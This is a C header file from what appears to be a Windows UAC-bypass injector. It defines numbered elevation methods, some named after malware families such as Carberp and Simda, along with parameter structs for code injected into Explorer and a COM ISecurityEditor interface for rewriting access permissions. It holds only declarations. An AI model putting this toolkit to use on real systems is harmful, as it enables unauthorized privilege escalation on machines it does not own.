/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       INJECT.H
*
*  VERSION:     1.93
*
*  DATE:        05 Nov 2015
*
*  Injector prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <AccCtrl.h>

#define METHOD_SYSPREP1     1
#define METHOD_SYSPREP2     2
#define METHOD_OOBE         3
#define METHOD_REDIRECTEXE  4
#define METHOD_SIMDA        5
#define METHOD_CARBERP      6
#define METHOD_CARBERP_EX   7
#define METHOD_TILON        8
#define METHOD_AVRF         9
#define METHOD_WINSAT       10
#define METHOD_SHIMPATCH    11
#define METHOD_SYSPREP3     12
#define METHOD_MMC          13
#define METHOD_H1N1         14
#define METHOD_GENERIC      15

typedef HRESULT(WINAPI *pfnCoInitialize)(LPVOID pvReserved);
typedef HRESULT(WINAPI *pfnCoCreateInstance)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID FAR * ppv);
typedef HRESULT(WINAPI *pfnCoGetObject)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv);
typedef HRESULT(WINAPI *pfnSHCreateItemFromParsingName)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv);
typedef BOOL(WINAPI *pfnShellExecuteExW)(SHELLEXECUTEINFOW *pExecInfo);
typedef DWORD(WINAPI *pfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL(WINAPI *pfnCloseHandle)(HANDLE hObject);
typedef void(WINAPI *pfnCoUninitialize)(void);
typedef void(WINAPI *pfnOutputDebugStringW)(LPCWSTR lpOutputString);

typedef struct _ELOAD_PARAMETERS {
	//
	IID		xIID_IShellItem;
	IID		xIID;
	CLSID	xCLSID;
	//
	pfnCoInitialize					xCoInitialize;
	pfnCoCreateInstance				xCoCreateInstance;
	pfnCoGetObject					xCoGetObject;
	pfnSHCreateItemFromParsingName	xSHCreateItemFromParsingName;
	pfnShellExecuteExW				xShellExecuteExW;
	pfnWaitForSingleObject			xWaitForSingleObject;
	pfnCloseHandle					xCloseHandle;
	pfnCoUninitialize				xCoUninitialize;
	pfnOutputDebugStringW			xOutputDebugStringW;

	WCHAR	EleMoniker[MAX_PATH];
	WCHAR	SourceFilePathAndName[MAX_PATH + 1];
	WCHAR	DestinationDir[MAX_PATH + 1];
	WCHAR	ExePathAndName[MAX_PATH + 1];
} ELOAD_PARAMETERS, *PELOAD_PARAMETERS;

typedef struct _ELOAD_PARAMETERS_2 {
	WCHAR   szKey[MAX_PATH + 1];
	WCHAR   szNewSDDL[MAX_PATH + 1];
	WCHAR	EleMoniker[MAX_PATH];
	//
	IID		xIID_ISecurityEditor;
	CLSID	xCLSID_ShellSecurityEditor;
	//
	pfnCoInitialize					xCoInitialize;
	pfnCoCreateInstance				xCoCreateInstance;
	pfnCoGetObject					xCoGetObject;
	pfnCoUninitialize				xCoUninitialize;
	pfnOutputDebugStringW			xOutputDebugStringW;
} ELOAD_PARAMETERS_2, *PELOAD_PARAMETERS_2;

typedef struct _ELOAD_PARAMETERS_3 {
	//common with ELOAD_PARAMETERS
	//
	IID		xIID_IShellItem;
	IID		xIID;
	CLSID	xCLSID;
	//
	pfnCoInitialize					xCoInitialize;
	pfnCoCreateInstance				xCoCreateInstance;
	pfnCoGetObject					xCoGetObject;
	pfnSHCreateItemFromParsingName	xSHCreateItemFromParsingName;
	PVOID							Spare0;
	PVOID							Spare1;
	PVOID							Spare2;
	pfnCoUninitialize				xCoUninitialize;
	pfnOutputDebugStringW			xOutputDebugStringW;

	WCHAR	EleMoniker[MAX_PATH];
	//end of common with ELOAD_PARAMETERS

	WCHAR	SourceFilePathAndName[MAX_PATH + 1];
	WCHAR	DestinationDir[MAX_PATH + 1];
} ELOAD_PARAMETERS_3, *PELOAD_PARAMETERS_3;

typedef struct _ELOAD_PARAMETERS_4 {
	WCHAR                           szVerb[MAX_PATH + 1];
	WCHAR                           szTargetApp[MAX_PATH * 4];
	pfnShellExecuteExW				xShellExecuteExW;
	pfnWaitForSingleObject			xWaitForSingleObject;
	pfnCloseHandle					xCloseHandle;
} ELOAD_PARAMETERS_4, *PELOAD_PARAMETERS_4;

typedef struct _ELOAD_PARAM_GLOBAL {
	BOOL                IsWow64;
	HINSTANCE           hKernel32;
	HINSTANCE           hOle32;
	HINSTANCE           hShell32;
	RTL_OSVERSIONINFOW  osver;
	WCHAR               szSystemDirectory[MAX_PATH + 1];
} ELOAD_PARAM_GLOBAL, *PELOAD_PARAM_GLOBAL;

extern ELOAD_PARAM_GLOBAL g_ldp;


typedef interface ISecurityEditor ISecurityEditor;

typedef struct ISecurityEditorVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE *QueryInterface)(
		__RPC__in ISecurityEditor * This,
		__RPC__in REFIID riid,
		_COM_Outptr_  void **ppvObject);

		ULONG(STDMETHODCALLTYPE *AddRef)(
			__RPC__in ISecurityEditor * This);

		ULONG(STDMETHODCALLTYPE *Release)(
			__RPC__in ISecurityEditor * This);

		HRESULT(STDMETHODCALLTYPE *GetSecurity)(
			__RPC__in ISecurityEditor * This,
			_In_ LPCOLESTR ObjectName,
			_In_ SE_OBJECT_TYPE ObjectType,
			_In_ SECURITY_INFORMATION SecurityInfo,
			_Out_opt_ LPCOLESTR * ppSDDLStr);

		HRESULT(STDMETHODCALLTYPE *SetSecurity)(
			__RPC__in ISecurityEditor * This,
			_In_ LPCOLESTR ObjectName,
			_In_ SE_OBJECT_TYPE ObjectType,
			_In_ SECURITY_INFORMATION SecurityInfo,
			_In_ LPCOLESTR ppSDDLStr);

	END_INTERFACE

} *PISecurityEditorVtbl;

interface ISecurityEditor
{
	CONST_VTBL struct ISecurityEditorVtbl *lpVtbl;
};

BOOL ucmInjectExplorer(
	_In_ LPVOID ElevParams,
	_In_ LPVOID ElevatedLoadProc
	);
